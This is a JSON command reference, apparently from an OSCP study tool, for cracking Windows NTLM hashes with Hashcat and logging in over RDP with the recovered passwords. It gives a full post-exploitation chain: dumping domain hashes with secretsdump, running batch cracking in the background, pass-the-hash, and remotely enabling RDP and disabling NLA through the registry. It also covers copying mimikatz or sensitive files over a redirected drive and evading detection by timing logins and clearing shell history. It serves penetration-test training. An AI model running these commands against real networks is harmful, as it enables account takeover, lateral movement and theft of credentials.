{
  "metadata": {
    "file_purpose": "Windows password cracking (Hashcat) and remote access (RDP) commands for post-exploitation workflows",
    "oscp_relevance": "HIGH - Essential for converting NTLM hashes to plaintext passwords and leveraging cracked credentials for RDP access. Hashcat runs in background while you continue lateral movement via Pass-the-Hash.",
    "educational_context": "After obtaining NTLM hashes via DCSync, SAM dump, or LSASS memory extraction, you have two options: (1) Use hash immediately for Pass-the-Hash authentication (Windows SMB/WMI), or (2) Crack the hash to plaintext password for RDP, web applications, or credential reuse testing. Hashcat leverages GPU acceleration for rapid cracking (millions of hashes/sec). RDP provides GUI access for tasks requiring interactive desktop (GUI tools, file browsing, screenshots).",
    "prerequisites": [
      "NTLM hash (from DCSync, SAM dump, LSASS memory, or other credential extraction)",
      "Hashcat installed (apt install hashcat) with GPU drivers (NVIDIA CUDA or AMD ROCm)",
      "Wordlist (rockyou.txt standard, /usr/share/wordlists/rockyou.txt)",
      "For RDP: xfreerdp or rdesktop installed, network access to RDP port 3389"
    ],
    "related_techniques": [
      "DCSync (ad-dcsync-secretsdump-user.json)",
      "Pass-the-Hash (ad-pass-the-hash.json)",
      "SAM Dump (ad-sam-dump.json)",
      "LSASS Memory Dump (ad-lsass-dump.json)"
    ],
    "attack_chain": [
      "1. Extract NTLM hashes (DCSync, SAM dump, LSASS memory)",
      "2. Save hashes to file (one per line, 32 hex characters)",
      "3. Start Hashcat in background: hashcat -m 1000 hashes.txt rockyou.txt & disown",
      "4. Meanwhile, use hashes for Pass-the-Hash lateral movement",
      "5. Check cracking progress periodically: hashcat --show",
      "6. When password cracks, use for RDP access: xfreerdp /u:USER /p:PASSWORD /v:TARGET",
      "7. Perform GUI-based enumeration, file transfer, screenshot capture",
      "8. Document cracked credentials in post_exploitation.md"
    ],
    "detection_evasion": [
      "Hashcat runs locally on attacker machine (no network traffic, undetectable)",
      "RDP generates Event ID 4624 Type 10 (RemoteInteractive) on target - HIGHLY monitored",
      "RDP creates visible session on target (other users can see login)",
      "Prefer command-line tools (psexec, wmiexec) over RDP when stealth matters",
      "If RDP required, connect during business hours to blend with legitimate usage"
    ]
  },
  "commands": [
    {
      "id": "windows-hashcat-crack-ntlm",
      "name": "Crack NTLM Hash with Hashcat (Single Hash)",
      "category": "post-exploit",
      "subcategory": "password-cracking",
      "command": "hashcat -m 1000 -a 0 <HASH_FILE> /usr/share/wordlists/rockyou.txt --force",
      "description": "Crack single NTLM password hash using dictionary attack with rockyou.txt wordlist. Mode 1000 is for NTLM hashes (32 hex characters). Use --force flag in VMs to bypass GPU checks. Hash cracks in seconds to hours depending on password complexity.",
      "variables": [
        {
          "name": "<HASH_FILE>",
          "description": "File containing NTLM hash (just 32 hex characters, no username/colons)",
          "example": "dave_hash.txt",
          "required": true
        }
      ],
      "flag_explanations": {
        "hashcat": "Advanced password recovery tool with GPU acceleration. Supports 300+ hash types. Leverages CUDA (NVIDIA) or OpenCL (AMD/Intel) for parallel hash computation. Speeds: CPU ~1M NTLM/sec, GPU ~10-100 BILLION NTLM/sec (depending on hardware). For OSCP, basic CPU cracking is sufficient for weak passwords.",
        "-m 1000": "Hash mode 1000 = NTLM. Each hash mode corresponds to different algorithm: 0=MD5, 100=SHA1, 1000=NTLM, 1800=SHA512(Unix), 3000=LM, 5600=NTLMv2, 13100=Kerberos TGS. NTLM is Windows default since Vista. Use hashcat --example-hashes | grep -A 3 'MODE: 1000' to see example NTLM hash format.",
        "-a 0": "Attack mode 0 = Straight dictionary attack (try each word in wordlist). Other modes: 1=Combination (combine words), 3=Brute-force (try all characters), 6=Hybrid Wordlist+Mask, 7=Hybrid Mask+Wordlist. For OSCP, -a 0 with rules (-r) cracks 70% of weak passwords. Example with rules: hashcat -m 1000 -a 0 hash.txt rockyou.txt -r best64.rule.",
        "<HASH_FILE>": "Text file containing NTLM hash. Format: Just the 32 hexadecimal characters (no username, no colons, no spaces). Example file content: 08d7a47a6f9f66b97b1bae4178747494. For multiple hashes: One hash per line. Create with: echo '<HASH>' > hash.txt OR extract from DCSync output: grep ':' secretsdump.txt | cut -d: -f4 > hashes.txt.",
        "/usr/share/wordlists/rockyou.txt": "Standard password wordlist included with Kali Linux. Contains 14 million real-world passwords from 2009 RockYou data breach. Compressed by default: gunzip /usr/share/wordlists/rockyou.txt.gz (one-time decompression). Cracks 30-50% of weak corporate passwords. For stronger passwords, use: crackstation-human-only.txt (1.5GB), weakpass_3.txt (8GB), or generate custom with CeWL (site-specific).",
        "--force": "Bypass warnings and GPU driver checks. REQUIRED in VMs or systems without proper GPU drivers. Hashcat detects virtual GPU and refuses to run without --force. Performance impact: CPU fallback is 100-1000x slower than GPU. For OSCP lab VMs, always use --force. Production pentesting: Install proper GPU drivers for massive speed increase."
      },
      "success_indicators": [
        "Output: 'Session..........: hashcat'",
        "Output: 'Status...........: Cracked' OR 'Exhausted'",
        "Cracked hash shows: '<HASH>:<PASSWORD>' in terminal output",
        "Saved to: hashcat.potfile (automatic potfile in ~/.hashcat/hashcat.potfile)",
        "View cracked: hashcat -m 1000 <HASH_FILE> --show (displays <HASH>:<PASSWORD>)"
      ],
      "failure_indicators": [
        "Status: Exhausted - Hash not in wordlist (try rules or different wordlist)",
        "clCreateContext(): CL_DEVICE_NOT_FOUND - No GPU detected (use --force)",
        "ATTENTION! OpenCL kernel self-test failed - GPU driver issue (use --force)",
        "No devices found/left - Hardware not detected (CPU-only: use --force)"
      ],
      "troubleshooting": {
        "Hash not cracked (Status: Exhausted)": "Password not in rockyou.txt wordlist. SOLUTIONS: (1) Add rules to modify wordlist: hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule (tries variations: uppercase, append numbers, leet speak). (2) Try larger wordlist: weakpass_3.txt. (3) Use mask attack for known pattern: hashcat -m 1000 hash.txt -a 3 ?u?l?l?l?l?d?d?d (8 chars: uppercase+4 lowercase+3 digits). (4) Accept hash is uncrackable and use Pass-the-Hash instead.",
        "clCreateContext(): CL_DEVICE_NOT_FOUND": "No GPU detected or OpenCL not configured. IMMEDIATE FIX: Add --force flag (enables CPU mode). PERMANENT FIX: Install GPU drivers: sudo apt install nvidia-driver nvidia-cuda-toolkit (NVIDIA) OR sudo apt install rocm-opencl-runtime (AMD). VERIFY: hashcat -I (lists detected devices). OSCP NOTE: GPU not required, --force CPU mode cracks weak passwords in minutes.",
        "ATTENTION! OpenCL kernel self-test failed": "GPU driver mismatch or virtualized GPU. SOLUTION: Use --force to bypass check and run in CPU mode. ALTERNATIVE: If physical GPU available, update drivers: sudo apt update && sudo apt full-upgrade. VERIFY drivers: nvidia-smi (NVIDIA) or rocm-smi (AMD). For OSCP VMs, always use --force.",
        "No hashes loaded / Invalid hash format": "Hash file format incorrect. VERIFY: (1) Hash is exactly 32 hexadecimal characters (0-9, a-f). Check with: wc -c hash.txt (should output 33 with newline). (2) No colons, no username, no spaces: CORRECT: 08d7a47a6f9f66b97b1bae4178747494. WRONG: dave:1103:aad3...:08d7... (full format). (3) Use: echo '<HASH>' | xxd to verify hex encoding. EXTRACT NTLM from full format: cat secretsdump.txt | cut -d: -f4 > hashes.txt."
      },
      "prerequisites": [],
      "next_steps": [
        "windows-rdp-xfreerdp",
        "ad-pass-the-hash-impacket-psexec"
      ],
      "alternatives": [
        "windows-hashcat-crack-ntlm-file",
        "john-wordlist-attack"
      ],
      "tags": [
        "PASSWORD_CRACKING",
        "HASHCAT",
        "NTLM",
        "POST_EXPLOITATION",
        "OSCP:HIGH",
        "OFFLINE_ATTACK"
      ],
      "oscp_relevance": "high",
      "notes": "Hashcat is ESSENTIAL for OSCP but NOT required for Windows authentication. CRITICAL MINDSET: Use hash immediately for Pass-the-Hash while cracking runs in background. WORKFLOW: (1) Extract hash, (2) Start Hashcat in background: hashcat -m 1000 hash.txt rockyou.txt --force & disown, (3) Use hash with psexec/wmiexec NOW (don't wait), (4) Check progress later: hashcat -m 1000 hash.txt --show. Password cracking is for: (1) RDP access (requires plaintext), (2) Web apps (require plaintext), (3) Credential reuse (test plaintext on other systems), (4) Reporting (demonstrate weak passwords).\n\nCOMPLEXITY VS TIME:\n- Weak (Password1, Welcome123): <1 minute with rockyou.txt\n- Medium (P@ssw0rd!, Spring2024!): 1-30 minutes with rules (best64.rule)\n- Strong (RandomPass123!@#): Hours to days (try combinator attack or larger wordlists)\n- Very Strong (20+ random chars): UNCRACKABLE - use Pass-the-Hash instead\n\nBACKGROUND EXECUTION:\nbash -c 'hashcat -m 1000 hash.txt rockyou.txt --force > /tmp/hashcat.log 2>&1 & disown'\nMonitor: tail -f /tmp/hashcat.log\nCheck status: hashcat -m 1000 hash.txt --show (lists cracked hashes)\n\nRULES FOR BETTER SUCCESS:\nhashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force\nbest64.rule: 64 common variations (uppercase, append numbers, leet speak)\ndive.rule: 99,092 rules (comprehensive, slower)\nOSCP-specific: Create custom rule for seasonal passwords (Spring2024, Fall2023)\n\nMULTIPLE HASHES:\ncat << EOF > hashes.txt\n08d7a47a6f9f66b97b1bae4178747494\n2892d26cdf84d7a70e2eb3b9f05c425e\n1693c6cefafffc7af11ef34d1c788f47\nEOF\nhashcat -m 1000 hashes.txt rockyou.txt --force --show (displays all cracked)\n\nTIME ESTIMATE: 10 seconds - 24 hours depending on password complexity. Weak passwords (<10 chars, dictionary words) crack in minutes.",
      "filled_example": "hashcat -m 1000 -a 0 dave_hash.txt /usr/share/wordlists/rockyou.txt --force"
    },
    {
      "id": "windows-hashcat-crack-ntlm-file",
      "name": "Crack Multiple NTLM Hashes from File (Batch)",
      "category": "post-exploit",
      "subcategory": "password-cracking",
      "command": "hashcat -m 1000 -a 0 <HASH_FILE> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force",
      "description": "Crack multiple NTLM hashes from file using dictionary attack with word mangling rules. Rules modify wordlist entries (uppercase, append numbers, leet speak) for higher crack rate. Ideal for batch processing domain hashes after DCSync full dump.",
      "variables": [
        {
          "name": "<HASH_FILE>",
          "description": "File with NTLM hashes, one per line (32 hex chars each, no usernames/colons)",
          "example": "all_domain_hashes.txt",
          "required": true
        }
      ],
      "flag_explanations": {
        "hashcat": "GPU-accelerated password recovery tool. See windows-hashcat-crack-ntlm for full explanation.",
        "-m 1000": "Hash mode for NTLM (Windows password hashes). See windows-hashcat-crack-ntlm for full explanation.",
        "-a 0": "Dictionary attack mode. Tries each word in wordlist (with optional rule modifications). See windows-hashcat-crack-ntlm for alternatives.",
        "<HASH_FILE>": "Text file containing one NTLM hash per line. Format: Each line is exactly 32 hexadecimal characters (0-9, a-f). NO usernames, NO colons, NO extra data. Example creation from DCSync output: impacket-secretsdump '<DOMAIN>/<USER>:<PASS>@<DC>' -just-dc > full_dump.txt && grep ':' full_dump.txt | cut -d: -f4 > hashes.txt. This extracts only NTLM hashes (4th colon-separated field) from secretsdump format.",
        "/usr/share/wordlists/rockyou.txt": "Standard 14M password wordlist. Must be decompressed first: gunzip /usr/share/wordlists/rockyou.txt.gz. See windows-hashcat-crack-ntlm for alternatives.",
        "-r /usr/share/hashcat/rules/best64.rule": "Apply 64 word-mangling rules to each wordlist entry. Rules: Uppercase first letter (Password \u2192 Password), All uppercase (password \u2192 PASSWORD), Append numbers (password \u2192 password1, password123), Leet speak (password \u2192 p@ssw0rd), Reverse (password \u2192 drowssap), etc. DRAMATICALLY increases crack rate (30% \u2192 70% for corporate passwords). Other rules: dive.rule (99K rules, comprehensive but slow), OneRuleToRuleThemAll.rule (53K rules, popular), d3ad0ne.rule (focused on complex variations).",
        "--force": "Bypass GPU checks and run in CPU mode. REQUIRED for VMs or systems without GPU drivers. See windows-hashcat-crack-ntlm for full explanation."
      },
      "success_indicators": [
        "Output: 'Recovered........: X/Y (Z%) Digests' - Shows crack progress",
        "Output: 'Status...........: Cracked' - All hashes cracked OR 'Exhausted' - Tried all combos",
        "View cracked hashes: hashcat -m 1000 <HASH_FILE> --show",
        "Potfile location: ~/.hashcat/hashcat.potfile (persistent across sessions)",
        "Cracked format: <HASH>:<PASSWORD> (one per line)"
      ],
      "failure_indicators": [
        "Status: Exhausted - Tried all wordlist+rules, some hashes remain uncracked (COMMON)",
        "Recovered: 0/50 - NO hashes cracked (wordlist mismatch or very strong passwords)",
        "GPU errors (see windows-hashcat-crack-ntlm troubleshooting)",
        "Hash parsing errors (verify file format: one hash per line, 32 hex chars)"
      ],
      "troubleshooting": {
        "Most hashes not cracking (low crack rate)": "Wordlist or rules insufficient. SOLUTIONS: (1) Use larger wordlist: weakpass_3.txt (8GB, billions of passwords), crackstation-human-only.txt (1.5GB). Download: https://weakpass.com/ or https://crackstation.net/. (2) Use better rules: hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/dive.rule (99K rules, 10-20x slower). (3) Try combinator attack: hashcat -m 1000 hash.txt -a 1 wordlist1.txt wordlist2.txt (combines two words). (4) Hybrid attack: hashcat -m 1000 hash.txt -a 6 rockyou.txt ?d?d?d (append 3 digits to wordlist). (5) Accept some hashes are uncrackable - use Pass-the-Hash for strong passwords.",
        "File format errors / No hashes loaded": "Hash file contains extra data or wrong format. VERIFY FORMAT: (1) View first 3 lines: head -3 <HASH_FILE>. Each line should be ONLY 32 hex characters. (2) Check line length: awk '{print length}' <HASH_FILE> | sort -u. Should output '32'. (3) Remove invalid lines: grep -E '^[a-f0-9]{32}$' <HASH_FILE> > clean_hashes.txt. (4) Extract NTLM from DCSync format: grep ':' secretsdump.txt | cut -d: -f4 | grep -E '^[a-f0-9]{32}$' > hashes.txt.",
        "Hashcat stops / Progress stuck": "Hashcat paused or waiting for user input. ACTIONS: (1) Check status: Press 's' key (shows current status without stopping). (2) Resume: Press 'r' key (resume if paused). (3) View real-time output: tail -f /tmp/hashcat.log (if redirected output). (4) Kill and restart with --status --status-timer=60 flag: hashcat -m 1000 hash.txt rockyou.txt --status --status-timer=60 (updates every 60 sec). (5) Check system resources: top (verify hashcat process running and consuming CPU/GPU).",
        "Out of memory / System freeze": "Hashcat + rules consume too much RAM or GPU memory. SOLUTIONS: (1) Reduce rules: Use best64.rule instead of dive.rule (64 rules vs 99K). (2) Split hash file: split -l 1000 hashes.txt hash_chunk_ (1000 hashes per file), then crack chunks separately. (3) Reduce wordlist: Use rockyou.txt instead of weakpass_3.txt. (4) Add swap space: sudo fallocate -l 8G /swapfile && sudo mkswap /swapfile && sudo swapon /swapfile. (5) Close other applications to free RAM."
      },
      "prerequisites": [],
      "next_steps": [
        "windows-rdp-xfreerdp",
        "ad-pass-the-hash-crackmapexec"
      ],
      "alternatives": [
        "windows-hashcat-crack-ntlm",
        "john-wordlist-attack"
      ],
      "tags": [
        "PASSWORD_CRACKING",
        "HASHCAT",
        "NTLM",
        "POST_EXPLOITATION",
        "OSCP:HIGH",
        "BATCH_PROCESSING",
        "RULES"
      ],
      "oscp_relevance": "high",
      "notes": "Use this for BATCH cracking after full DCSync domain dump (ad-dcsync-secretsdump-all). TYPICAL OSCP SCENARIO: (1) Achieve Domain Admin, (2) DCSync entire domain (may be 50-500 users), (3) Extract NTLM hashes to file, (4) Start Hashcat in background with rules, (5) Continue exam while cracking runs, (6) Check back periodically for newly cracked credentials.\n\nEXPECTED CRACK RATES (with best64.rule):\n- rockyou.txt alone: 30-40% of corporate passwords\n- rockyou.txt + best64.rule: 60-75% of corporate passwords\n- rockyou.txt + dive.rule: 70-85% (but takes 10-20x longer)\n- Custom wordlist (company name, locations): +10-15% additional cracks\n\nBACKGROUND EXECUTION BEST PRACTICE:\nbash -c 'hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --status --status-timer=300 > /tmp/hashcat_$(date +%s).log 2>&1 & disown'\n\nMONITORING:\n# View cracked so far:\nhashcat -m 1000 hashes.txt --show | wc -l\n\n# View cracked passwords:\nhashcat -m 1000 hashes.txt --show\n\n# View cracked with usernames (if you kept mapping file):\nwhile IFS=: read hash user; do \n  cracked=$(hashcat -m 1000 hashes.txt --show 2>/dev/null | grep \"^$hash:\" | cut -d: -f2)\n  [ -n \"$cracked\" ] && echo \"$user:$cracked\"\ndone < user_hash_map.txt\n\nCREATING USER-TO-HASH MAPPING:\n# During hash extraction, preserve usernames:\nimpacket-secretsdump 'domain/user:pass@dc' -just-dc > full_dump.txt\ngrep ':' full_dump.txt | awk -F: '{print $4 \":\" $1}' > user_hash_map.txt\n# Format: NTLM_HASH:USERNAME\n# Use for reporting: correlate cracked passwords back to usernames\n\nRULE SELECTION GUIDANCE:\n- OSCP Exam (time limited): best64.rule (fast, good results)\n- Lab Practice: dive.rule OR d3ad0ne.rule (comprehensive)\n- Corporate Pentest: OneRuleToRuleThemAll.rule (balanced)\n- Custom: Create rule for seasonal passwords (Spring2024!, Fall2023!)\n\nCUSTOM RULE EXAMPLE (save as oscp.rule):\n:\nc\nu\nl ^0 $1\n$1 $2 $3\n$! $@\n# Explanation: Try original, capitalize, uppercase, lowercase, prepend 0 append 1, append 123, append !@\n# Use: hashcat -m 1000 hash.txt rockyou.txt -r oscp.rule\n\nTIME ESTIMATES:\n- rockyou.txt alone: 2-10 minutes (14M passwords \u00d7 hash speed)\n- rockyou.txt + best64.rule: 10-60 minutes (14M \u00d7 64 rules = 896M candidates)\n- rockyou.txt + dive.rule: 2-10 hours (14M \u00d7 99K rules = 1.4 trillion candidates)\n- Depends on hardware: CPU (1-10M hash/sec), GPU (100M-10B hash/sec)\n\nOSCP EXAM STRATEGY:\n1. Start cracking immediately after DCSync: hashcat ... & disown\n2. Continue with other exam objectives (don't wait)\n3. Check status every hour: hashcat --show | wc -l\n4. Use cracked credentials for NEW lateral movement paths\n5. Document all cracked passwords in post_exploitation.md\n6. If exam time running low, accept uncracked hashes and use PTH instead",
      "filled_example": "hashcat -m 1000 -a 0 all_domain_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"
    },
    {
      "id": "windows-rdp-xfreerdp",
      "name": "RDP Connection with xfreerdp (GUI Access)",
      "category": "exploitation",
      "subcategory": "remote-access",
      "command": "xfreerdp /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /v:<TARGET> /cert-ignore /dynamic-resolution",
      "description": "Connect to Windows system via Remote Desktop Protocol (RDP) for full GUI access. Requires plaintext password (cracked from hash) or RDP-compatible credentials. Useful for GUI-only tools, file browsing, screenshot capture, and interactive exploitation.",
      "variables": [
        {
          "name": "<USERNAME>",
          "description": "Windows username (without domain prefix - use /d flag for domain)",
          "example": "dave",
          "required": true
        },
        {
          "name": "<PASSWORD>",
          "description": "Plaintext password (cracked from NTLM hash or obtained from credential dump)",
          "example": "Flowers1",
          "required": true
        },
        {
          "name": "<DOMAIN>",
          "description": "Domain name (NetBIOS or FQDN). Use '.' for local authentication on standalone systems.",
          "example": "corp.com",
          "required": false
        },
        {
          "name": "<TARGET>",
          "description": "Target system IP address or FQDN",
          "example": "192.168.50.75",
          "required": true
        }
      ],
      "flag_explanations": {
        "xfreerdp": "Open-source RDP client for Linux. Full-featured alternative to Windows Remote Desktop. Supports RDP 8.1, RemoteFX, clipboard sharing, drive redirection, multi-monitor. Alternatives: rdesktop (older, limited features), remmina (GUI-based RDP client), Remmina (full remote desktop manager with RDP/VNC/SSH). Install: sudo apt install freerdp2-x11.",
        "/u:<USERNAME>": "Username for authentication. Do NOT include domain prefix (use /d flag separately). Local account: 'Administrator'. Domain user: 'dave'. Service account: 'sqlsvc'. IMPORTANT: Username is case-insensitive but must match account name exactly (spacing matters).",
        "/p:<PASSWORD>": "Plaintext password for authentication. Special characters allowed (no escaping needed in most cases). If password contains spaces, use quotes: /p:\"Pass Word 123\". ALTERNATIVE: Omit /p flag to be prompted interactively (avoids password in bash history). SECURITY NOTE: Password visible in process list (ps aux) - use with caution on shared systems.",
        "/d:<DOMAIN>": "Domain for authentication. NetBIOS name: 'CORP'. FQDN: 'corp.com'. For local (non-domain) authentication: Use '.' (period) OR omit flag entirely. CRITICAL: If account is domain user, MUST specify domain (authentication fails without it). Verify domain: echo %USERDNSDOMAIN% (from Windows) or realm list (from Linux).",
        "/v:<TARGET>": "Target system IP or hostname. IP address: 192.168.50.75 (fast, direct connection). FQDN: CLIENT75.corp.com (required if Kerberos enforced). Hostname only: CLIENT75 (works if DNS configured). Port specification: 192.168.50.75:3390 (non-standard RDP port). VERIFY: sudo nmap -p 3389 -Pn <TARGET> (check RDP port open).",
        "/cert-ignore": "Ignore SSL certificate warnings. REQUIRED for self-signed certificates (default on Windows). Without this flag, connection fails with 'Certificate verification failed' error. SECURITY NOTE: Disables certificate validation (vulnerable to MITM attacks). For production pentesting, verify certificate first. For OSCP labs, always use /cert-ignore.",
        "/dynamic-resolution": "Automatically adjust resolution when resizing window. RECOMMENDED for usability - allows window resizing without reconnecting. Alternative: /size:1920x1080 (fixed resolution). Multi-monitor: /multimon (span across all monitors). Fullscreen: /f (toggle with Ctrl+Alt+Enter)."
      },
      "success_indicators": [
        "RDP window opens showing Windows login screen OR desktop",
        "Output: 'connected to <TARGET>:3389' in terminal",
        "Windows desktop visible with start menu, taskbar, etc.",
        "Can interact with GUI (open applications, browse files, etc.)",
        "Clipboard sharing works (copy/paste between Kali and Windows)"
      ],
      "failure_indicators": [
        "freerdp_set_last_error_ex ERRCONNECT_LOGON_FAILURE - Wrong username/password",
        "freerdp_set_last_error_ex ERRCONNECT_ACCOUNT_DISABLED - Account locked/disabled",
        "connect: Connection refused - RDP port 3389 closed or firewall blocking",
        "certificate verify failed - Missing /cert-ignore flag",
        "NLA authentication required - Need /sec:nla flag OR disable Network Level Authentication"
      ],
      "troubleshooting": {
        "ERRCONNECT_LOGON_FAILURE": "Authentication failed. VERIFY: (1) Password is PLAINTEXT (not NTLM hash - RDP doesn't support PTH). If you have hash, crack it first: hashcat -m 1000 hash.txt rockyou.txt. (2) Username matches account name exactly (case-insensitive but check spelling). (3) Domain specified correctly: /d:corp.com OR /d:CORP. For local auth, use /d:. (4) Account not locked: crackmapexec smb <TARGET> -u <USER> -p <PASS> -d <DOMAIN> (verify 'Pwn3d!'). TEST: smbclient //<TARGET>/C$ -U '<DOMAIN>/<USER>%<PASS>' (verify password works for SMB).",
        "ERRCONNECT_ACCOUNT_DISABLED or ACCOUNT_LOCKED_OUT": "Account is locked or disabled in Active Directory. CAUSES: (1) Too many failed login attempts (account lockout policy, typically 3-5 attempts). (2) Administrator manually disabled account. (3) Account expired (check expiration date). VERIFY: net user <USERNAME> /domain (shows 'Account active: No'). SOLUTIONS: (1) Wait for lockout duration (default 30 minutes): net accounts /domain | grep 'Lockout duration'. (2) Use different account with admin rights. (3) Request unlock from domain admin (social engineering vector). (4) Exploit password policy: Try 1-2 attempts, wait, try again (stay below lockout threshold).",
        "Connection refused / Port 3389 closed": "RDP port 3389 is blocked or RDP service disabled. VERIFY: (1) Port scan: sudo nmap -p 3389 -Pn -v <TARGET>. Should show '3389/tcp open'. (2) Service status (if you have shell): sc query TermService (should show 'RUNNING'). (3) Firewall: netsh advfirewall firewall show rule name=\"Remote Desktop\" (should show 'Enabled: Yes'). SOLUTIONS: (1) Enable RDP remotely (if admin access via psexec): reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes. (2) Use alternative access (psexec, wmiexec) to enable RDP. (3) Try WinRM: evil-winrm -i <TARGET> -u <USER> -p <PASS>.",
        "Certificate verify failed": "SSL certificate validation error. SOLUTION: Add /cert-ignore flag. FULL COMMAND: xfreerdp /u:<USER> /p:<PASS> /d:<DOMAIN> /v:<TARGET> /cert-ignore /dynamic-resolution. ALTERNATIVE: Use /cert:tofu (Trust On First Use - accept cert on first connection, remember for future).",
        "NLA authentication required / ERRCONNECT_AUTHENTICATION_FAILED": "Network Level Authentication (NLA) is enforced. NLA requires authentication BEFORE RDP connection (more secure, prevents brute force). SOLUTIONS: (1) Add /sec:nla flag: xfreerdp /u:<USER> /p:<PASS> /d:<DOMAIN> /v:<TARGET> /sec:nla /cert-ignore. (2) If NLA fails, disable NLA remotely (requires admin access via psexec): reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f. (3) Try older security: /sec:rdp or /sec:tls."
      },
      "prerequisites": [],
      "next_steps": [
        "windows-search-sensitive-files",
        "ad-lsass-dump-procdump",
        "windows-screenshot-capture"
      ],
      "alternatives": [
        "ad-pass-the-hash-impacket-psexec",
        "evil-winrm-shell"
      ],
      "tags": [
        "RDP",
        "REMOTE_ACCESS",
        "LATERAL_MOVEMENT",
        "POST_EXPLOITATION",
        "OSCP:MEDIUM",
        "GUI",
        "WINDOWS"
      ],
      "oscp_relevance": "medium",
      "notes": "RDP is USEFUL but NOT REQUIRED for OSCP. Command-line tools (psexec, wmiexec) are often more efficient. USE RDP WHEN: (1) GUI-only tool needed (GUI exploit, graphical config tool), (2) File browsing is easier visually (searching desktop, documents), (3) Screenshot needed for proof (exam flag documentation), (4) Interactive debugging required.\n\nDISADVANTAGES OF RDP:\n- Requires plaintext password (must crack NTLM hash first - takes time)\n- Generates Event ID 4624 Type 10 (RemoteInteractive) - HIGHLY monitored\n- Creates visible session on target (other users see login notification)\n- Slower than command-line (GUI rendering overhead)\n- May disconnect other RDP sessions (default limit: 2 concurrent sessions)\n\nADVANTAGES OF RDP:\n- Full GUI access (run any application)\n- Clipboard sharing (copy/paste files, text between Kali and Windows)\n- Drive redirection (mount Kali filesystem in Windows: /drive:/tmp,/tmp)\n- Screenshot capture (proof for OSCP report)\n- Easier for complex tasks (browsing registry, file system)\n\nOSCP EXAM WORKFLOW:\n1. Obtain NTLM hash via DCSync or SAM dump\n2. Start Hashcat in background: hashcat -m 1000 hash.txt rockyou.txt & disown\n3. Meanwhile, use hash for Pass-the-Hash (psexec, wmiexec)\n4. When password cracks, connect via RDP for GUI tasks\n5. Take screenshot of flag (OSCP proof requirement)\n6. Dump LSASS, search for sensitive files\n7. Disconnect and continue with command-line tools\n\nDRIVE REDIRECTION (File Transfer):\nxfreerdp /u:<USER> /p:<PASS> /d:<DOMAIN> /v:<TARGET> /cert-ignore /dynamic-resolution /drive:/tmp,/tmp\n# This mounts /tmp from Kali as \\\\tsclient\\tmp in Windows\n# Transfer files: copy C:\\sensitive.txt \\\\tsclient\\tmp\\\n# Or: copy \\\\tsclient\\tmp\\mimikatz.exe C:\\Users\\Public\\\n\nCLIPBOARD SHARING (Default Enabled):\n# Copy text from Kali terminal, paste in Windows RDP session\n# Copy file path in Windows, paste in Kali terminal\n# Useful for long file paths, command output, etc.\n\nSCREENSHOT CAPTURE (OSCP Proof):\n1. Connect via RDP\n2. Open flag file: type C:\\Users\\Administrator\\Desktop\\proof.txt\n3. Take screenshot: scrot -s /tmp/proof_screenshot.png (on Kali, select RDP window)\n4. Or use Windows Snipping Tool, save to \\\\tsclient\\tmp\n5. Include in OSCP report as proof of Administrator access\n\nALTERNATIVE RDP CLIENTS:\n- rdesktop: Older, simpler. Usage: rdesktop -u <USER> -p <PASS> -d <DOMAIN> <TARGET>\n- Remmina: GUI-based. Better for persistent connections, multiple sessions\n- Windows RDP (mstsc.exe via Wine): Not recommended, use native Linux tools\n\nCOMMON MISTAKES:\n- Forgetting /cert-ignore (connection fails silently)\n- Using NTLM hash instead of plaintext password (RDP doesn't support PTH)\n- Not specifying domain (/d flag) for domain accounts (authentication fails)\n- Connecting to DC via RDP during exam (generates alerts, use command-line instead)\n- Not using drive redirection for file transfer (manual SMB setup more complex)\n\nSECURITY CONSIDERATIONS:\n- Password visible in bash history (use history -c to clear after exam)\n- Password visible in process list (ps aux shows command with /p flag)\n- RDP session logged on target (Event ID 4624 Type 10, 4634 on logoff)\n- Connection generates network traffic (RDP handshake, encryption negotiation)\n- For stealth, use command-line tools (psexec, wmiexec) instead\n\nTIME ESTIMATE: 5-15 seconds for connection, <1 second for subsequent reconnections",
      "filled_example": "xfreerdp /u:dave /p:Flowers1 /d:corp.com /v:192.168.50.75 /cert-ignore /dynamic-resolution"
    }
  ]
}